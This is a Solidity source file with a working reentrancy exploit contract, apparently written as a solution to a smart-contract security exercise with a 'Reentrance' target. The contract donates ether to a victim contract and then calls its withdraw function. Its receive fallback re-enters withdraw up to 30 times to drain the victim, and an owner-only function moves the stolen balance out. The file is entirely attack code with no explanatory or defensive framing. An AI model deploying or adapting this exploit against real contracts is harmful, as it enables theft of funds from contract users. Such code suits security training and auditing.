pragma solidity ^0.6.0;

interface Reentrance {
    function withdraw(uint _amount) external;
    function donate(address who) external payable;
}

contract Attack {
    address payable owner;
    address payable vic;
    uint count;



    modifier onlyOwner {
        require(msg.sender == owner, 'cino');
        _;

    }
    constructor(address _vic) public {
        owner = msg.sender;
        vic = payable(_vic);
    }

    function attack(uint v) external  {
        
        Reentrance _vic = Reentrance(vic);
        _vic.donate{value: v}(address(this));
        _vic.withdraw(v);
        

    }

    receive() external payable {
        
        if (msg.sender != owner && count < 30) {
            Reentrance vic = Reentrance(vic);
            vic.withdraw(msg.value);
            count++;
        }
        
        
    }

    function transfer() onlyOwner external {
        
        owner.transfer(address(this).balance);
    }

    

}
